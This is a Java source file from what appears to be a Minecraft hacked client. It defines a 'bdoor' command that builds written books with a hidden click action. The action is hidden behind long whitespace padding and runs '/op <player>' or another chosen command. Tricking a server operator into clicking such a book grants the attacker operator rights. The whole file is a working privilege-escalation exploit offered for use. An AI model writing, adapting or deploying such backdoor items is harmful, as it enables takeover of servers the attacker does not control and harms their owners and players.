package net.shadow.feature.command;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.feature.base.Command;
import java.util.List;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.Utils;

public class BackdoorCmd extends Command {
    public BackdoorCmd() {
        super("bdoor", "creates forceop books");
    }

    @Override
    public List<String> completions(int index, String[] args){
        if(index == 0){
            return List.of(new String[]{"mybooktitle"});
        }
        if(index == 1){
            return List.of(new String[]{"mybooktext"});
        }
        if(index == 2){
            return List.of(new String[]{"/op " + Shadow.c.player.getGameProfile().getName()});
        }
        return List.of(new String[0]);
    }

    @Override
    public void call(String[] args) {
        String message = "\u00a78Shadow Player Kicker";
        try {
            if (args.length < 1) {
                Item item = Registry.ITEM.get(new Identifier("written_book"));
                ItemStack stack = new ItemStack(item, 1);
                String bookauthor = Shadow.c.getSession().getProfile().getName();
                String booktitle = Utils.getRandomTitle();
                String booktext = Utils.getRandomContent();
                String bookcommand = "/op " + bookauthor;
                NbtCompound tag = StringNbtReader.parse("{title:\"" + booktitle + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + booktext + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + bookcommand + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                stack.setNbt(tag);

                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                ChatUtils.message("Book Exploit Created");
            } else {
                Item item = Registry.ITEM.get(new Identifier("written_book"));
                ItemStack stack = new ItemStack(item, 1);
                String bookauthor = Shadow.c.getSession().getProfile().getName();
                String booktitle = args[0];
                booktitle = booktitle.replace("-", " ");
                String booktext = args[1];
                booktext = booktext.replace("-", " ").replace("\\\\", "\\");
                String bookcommand = args[2];
                bookcommand = bookcommand.replace("-", " ").replace("\\\\", "\\");
                NbtCompound tag = StringNbtReader.parse("{title:\"" + booktitle + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + booktext + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + bookcommand + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                stack.setNbt(tag);

                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                ChatUtils.message("Book Exploit Created");
            }
        } catch (Exception e) {
            {
                ChatUtils.message("Please use the format >backdoor <title> <text> <command>");
            }
        }
    }
}
